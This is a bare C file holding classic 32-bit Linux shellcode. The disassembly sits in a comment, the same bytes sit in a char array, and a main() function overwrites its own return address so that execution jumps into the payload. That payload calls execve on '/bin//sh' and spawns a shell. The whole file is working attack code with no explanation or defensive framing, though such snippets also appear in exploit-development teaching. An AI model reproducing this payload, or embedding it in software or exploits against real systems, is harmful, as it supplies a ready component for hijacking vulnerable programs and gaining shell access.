
/*
 8048054:	31 c0                	xor    %eax,%eax
 8048056:	50                   	push   %eax
 8048057:	68 2f 2f 73 68       	push   $0x68732f2f
 804805c:	68 2f 62 69 6e       	push   $0x6e69622f
 8048061:	b0 0b                	mov    $0xb,%al
 8048063:	89 e3                	mov    %esp,%ebx
 8048065:	31 d2                	xor    %edx,%edx
 8048067:	52                   	pushl   %edx
 8048068:	53                   	pushl   %ebx
 8048069:	89 e1                	mov    %esp,%ecx
 804806b:	cd 80                	int    $0x80
*/

#include <stdio.h>
#include <unistd.h>

char shellcode[]= "\x31\xc0"			//xor    %eax,%eax
	          "\x50"			//push   %eax
		  "\x68\x2f\x2f\x73\x68"	//push   $0x68732f2f
		  "\x68\x2f\x62\x69\x6e"	//push   $0x6e69622f
		  "\xb0\x0b"			//mov    $0xb,%al
		  "\x89\xe3"			//mov    %esp,%ebx
		  "\x31\xd2"			//xor    %edx,%edx
		  "\x52"			//pushl  %edx
		  "\x53"			//pushl  %ebx
		  "\x89\xe1"			//mov    %esp,%ecx
		  "\xcd\x80";			//int    $0x80



int main(int argc, char *argv[])
{

	int *ret;	
	ret = (int *)&ret+2;
	(*ret) = (int)shellcode;
	
	return 0;
}

